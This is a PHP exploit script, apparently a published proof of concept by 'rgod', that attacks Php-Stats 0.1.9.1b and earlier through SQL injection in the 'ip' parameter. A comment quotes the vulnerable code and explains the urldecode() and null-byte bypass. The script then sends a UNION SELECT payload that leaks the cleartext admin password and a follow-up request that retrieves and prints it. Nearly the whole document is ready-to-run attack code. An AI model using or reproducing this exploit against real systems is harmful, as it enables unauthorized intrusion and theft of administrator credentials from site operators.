Php-Stats <= 0.1.9.1b (ip) Remote SQL Injection Exploit
=======================================================




<?php
print_r(&#039;
---------------------------------------------------------------------------
Php-Stats <= 0.1.9.1b "ip" urldecode()/ ereg() / sql injection / cleat text
admin pass disclosure exploit (method ii)
by rgod
---------------------------------------------------------------------------
&#039;);

if ($argc<3) {
    print_r(&#039;
---------------------------------------------------------------------------
Usage: php &#039;.$argv[0].&#039; host path OPTIONS
host:      target server (ip/hostname)
path:      path to phpstats
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php &#039;.$argv[0].&#039; localhost /stats/ -P1.1.1.1:80
php &#039;.$argv[0].&#039; localhost /php-stats/stats/ -p81
---------------------------------------------------------------------------
&#039;);
    die;
}

error_reporting(7);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result=&#039;&#039;;$exa=&#039;&#039;;$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = &#039;(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)&#039;;

function send($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy==&#039;&#039;) {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo &#039;No response from &#039;.$host.&#039;:&#039;.$port; die;
    }
  }
  else {
    if (!$c) {
      echo &#039;Not a valid proxy...&#039;;die;
    }
    $parts=explode(&#039;:&#039;,$proxy);
    $parts[1]=(int)$parts[1];
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo &#039;No response from proxy...&#039;;die;
	}
  }
  fputs($ock,$packet);
  if ($proxy==&#039;&#039;) {
    $html=&#039;&#039;;
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html=&#039;&#039;;
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$proxy="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=(int)str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if (($path[0]<>&#039;/&#039;) or ($path[strlen($path)-1]<>&#039;/&#039;)) {echo &#039;Error... check the path!&#039;; die;}
if ($proxy==&#039;&#039;) {$p=$path;} else {$p=&#039;http://&#039;.$host.&#039;:&#039;.$port.$path;}

function my_enc($my_string)
{
  $encoded="CHAR(";
  for ($k=0; $k<=strlen($my_string)-1; $k++)
  {
    $encoded.=ord($my_string[$k]);
    if ($k==strlen($my_string)-1) {$encoded.=")";}
    else {$encoded.=",";}
  }
  return $encoded;
}
/*
vulnerable code, php-stats.recphp.php, near line 61-70:

if(isset($_GET[&#039;ip&#039;]) && $option[&#039;accept_ssi&#039;]){
  $ip=urldecode($_GET[&#039;ip&#039;]);
  if(!ereg(&#039;^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$&#039;,$ip)) return(0);
  if(isset($_GET[&#039;user_agent&#039;])) $HTTP_USER_AGENT=htmlspecialchars(addslashes($_GET[&#039;user_agent&#039;])); else return(0);
  if(isset($_GET[&#039;page&#039;])) $tmp=htmlspecialchars(addslashes($_GET[&#039;page&#039;]));
  $loaded=str_replace(Array(&#039;%A7%A7%A7%A7&#039;,&#039;%A7%A7&#039;),Array(&#039;?&#039;,&#039;&&#039;),$tmp);
  if(isset($_GET[&#039;lang&#039;])) $lang=htmlspecialchars(addslashes($_GET[&#039;lang&#039;]));
  $ssiMode=true;
}

this one exploits the ip argument and works with &#039;accept_ssi&#039; option enabled,
you bypass magic_quotes_gpc because of urldecode() and bypass regex check
because ereg() is not binary safe (you can use a null char)
*/

$SQL="1.1.1.255\x00&#039;/**/UNION/**/SELECT/**/null,null,CONCAT(".my_enc("<!--").",value,".my_enc("-->")."),null,null,null,null,null,null,null/**/FROM/**/php_stats_config/**/WHERE/**/name=&#039;admin_pass&#039;/*";
$SQL=str_replace("%00","%2500",str_replace("%27","%2527",urlencode($SQL)));
$packet ="GET ".$p."php-stats.recphp.php?ip=$SQL&user_agent=1 HTTP/1.0\r\n";
$packet.="User-Agent: Mozilla/5.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
send($packet);

$packet ="GET ".$p."admin.php?action=details HTTP/1.0\r\n";
$packet.="User-Agent: Mozilla/5.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
send($packet);
$t=explode("whois.php?IP=<!--",$html);
$t2=explode("-->",$t[1]);
$pass=$t2[0];
echo "admin pass -> ".$pass."\n";

?>



